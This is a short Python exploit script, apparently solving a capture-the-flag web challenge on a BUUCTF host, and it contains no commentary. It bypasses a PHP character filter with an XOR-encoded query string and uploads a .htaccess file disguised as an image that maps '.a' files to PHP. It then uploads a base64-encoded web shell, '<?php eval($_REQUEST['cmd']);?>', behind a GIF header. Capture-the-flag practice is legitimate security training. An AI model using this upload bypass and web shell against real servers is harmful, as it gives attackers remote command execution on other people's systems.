import requests
import time

url = r"http://39ac939e-72e7-480b-8036-95e8ae7274dd.node4.buuoj.cn:81/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag"
session = requests.session()
htaccess_content = '''
#define width 1337
#define height 1337
AddType application/x-httpd-php .a
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"
'''
files_htaccess = {'file': (
    '.htaccess', htaccess_content, 'image/jpeg')}
res_hta = session.post(url, files=files_htaccess)
print(res_hta.text)
shell_file = 'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='
files_shell = {'file': (
    'shell.a', shell_file, 'image/jpeg')}
res_jpg = session.post(url, files=files_shell)

print(res_jpg.text)